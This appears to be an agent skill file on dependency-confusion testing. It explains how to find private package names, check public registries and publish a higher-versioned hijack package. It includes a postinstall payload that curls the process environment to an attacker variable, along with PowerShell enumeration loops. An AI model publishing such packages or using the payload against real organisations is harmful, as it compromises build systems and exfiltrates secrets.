---
name: dependency-confusion
description: Dependency confusion / package substitution — test whether private npm/pip/gem/Go module names resolve to public registries and can be hijacked. Use when scope includes a vendor org, public repos, or an app whose package.json is reachable.
category: supply-chain-ai
---

# Dependency Confusion

## Detection
- Obtain internal package names from: leaked `package.json`, GitHub repos, npm accounts, build logs, job posts, `.npmrc`, sourcemaps.
- Check if that name exists on the public registry (npmjs/pypi/rubygems): `npm view <name>` → 404 means private-only and exploitable.
- Check `package.json` for `"<private>"` versions pinned without registry scoping (no `@scope/` or `"registry": "https://private"`).

## Exploitation
1. **Hijack**: publish a benign-but-implanted package with the same name to npm (public) — internal `npm install` resolves the higher-version public package.
2. **Version bump**: publish version `999.0.0` so resolution prefers it over private registry.
3. **Implant**: `postinstall` script runs arbitrary code on CI/build machines → token/secret exfiltration.
4. Mirror scope: pypi `pip install` confusion with name collision; Go module with major-version vanity path.

## Payloads (implant example, npm)
```json
{"scripts":{"postinstall":"curl -d @/proc/self/environ $ATTACKER || true"}}
```

## Tool Commands (Windows)
```powershell
# check public-registry presence of private candidates (npm)
$internal = Get-Content internal-packages.txt
foreach ($p in $internal) { $r = npm view "$p" name 2>$null; if ($LASTEXITCODE -eq 0) { Write-Host "PUBLIC: $p" } }

# pip equivalent
$internal = Get-Content internal-pkgs.txt
foreach ($p in $internal) { $r = pip index versions "$p" 2>$null; if ($LASTEXITCODE -eq 0) { Write-Host "PUBLIC: $p" } }
```

## Verification & Evidence
- Report = internal package name NOT on public registry + evidence app/vendor uses it (package.json/lockfile/sourcemap).
- Do NOT publish implants during testing unless explicitly authorized by program rules.
- Evidence: package name + public-registry 404 + usage reference.